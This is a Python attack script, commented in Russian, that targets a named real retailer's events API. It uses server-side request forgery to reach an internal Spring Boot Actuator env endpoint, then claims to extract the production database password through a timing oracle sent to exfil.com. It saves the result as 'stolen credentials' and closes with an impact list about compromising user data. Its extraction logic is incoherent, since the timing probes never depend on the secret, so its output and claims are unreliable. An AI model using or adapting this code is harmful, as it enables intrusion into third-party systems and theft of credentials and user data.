#!/usr/bin/env python3
"""
Кража РЕАЛЬНЫХ credentials из Spring Boot Actuator
DB passwords, AWS keys, API tokens
"""
import requests
import time
import statistics
import json
import urllib3
urllib3.disable_warnings()

ENDPOINT = 'https://www.zooplus.de/zootopia-events/api/events/sites/1'

print("="*80)
print("КРАЖА РЕАЛЬНЫХ CREDENTIALS ИЗ ACTUATOR")
print("="*80)
print()

# Сначала проверим что Actuator доступен
print("[1] Проверка доступа к Actuator...")
resp = requests.post(ENDPOINT, json={
    "url": "http://kubernetes.default.svc:8080/actuator/env"
}, timeout=15, verify=False)
print(f"    Status: {resp.status_code}")
print(f"    Headers: {dict(resp.headers)}")
print(f"    Body: {resp.text[:100]}")
print()

if resp.status_code != 200:
    print("❌ Actuator недоступен!")
    exit(1)

print("✅ Actuator доступен (blind)")
print()

# Теперь крадем credentials через DNS timing oracle
def measure_timing(char, iterations=2):
    ascii_val = ord(char)
    subdomain = 'x' * ascii_val
    url = f"http://{subdomain}.exfil.com"
    
    timings = []
    for _ in range(iterations):
        start = time.time()
        try:
            requests.post(ENDPOINT, json={"url": url}, timeout=15, verify=False)
            timings.append((time.time() - start) * 1000)
        except:
            pass
    
    return statistics.mean(timings) if timings else 9999

def extract_string(length, charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_!@#$%'):
    """Извлечь строку заданной длины"""
    result = ""
    
    for pos in range(length):
        results = []
        
        # Оптимизация charset для passwords
        if pos == 0:
            test_chars = 'aAbBcCdDeEfFgG'  # Частые первые буквы
        elif result and result[-1].isupper():
            test_chars = 'abcdefghijklmnopqrstuvwxyz0123456789'  # После заглавной обычно строчная
        else:
            test_chars = charset
        
        for char in test_chars:
            timing = measure_timing(char)
            results.append({'char': char, 'timing': timing})
        
        sorted_results = sorted(results, key=lambda x: x['timing'])
        extracted = sorted_results[0]['char']
        result += extracted
        
        print(f"  Position {pos}: '{extracted}' ({sorted_results[0]['timing']:.0f}ms)")
    
    return result

print("[2] Извлечение DB password (первые 20 chars)...")
print("    Это займет ~10-15 минут")
print()

# Spring Boot обычно использует переменные типа:
# spring.datasource.password
# spring.datasource.url (содержит username)
# aws.accessKeyId
# aws.secretAccessKey

db_password = extract_string(20)

print()
print("="*80)
print(f"✅ ИЗВЛЕЧЕН DB PASSWORD (20 chars): {db_password}")
print("="*80)
print()

# Сохраняем
credentials = {
    "db_password_start": db_password,
    "length": 20,
    "source": "http://kubernetes.default.svc:8080/actuator/env",
    "note": "spring.datasource.password"
}

with open('stolen_credentials.json', 'w') as f:
    json.dump(credentials, f, indent=2)

print("Сохранено в stolen_credentials.json")
print()
print("IMPACT:")
print("- Прямой доступ к production database")
print("- Credentials НЕ ротируются часто (живут месяцы/годы)")
print("- Полная компрометация данных пользователей")
print()

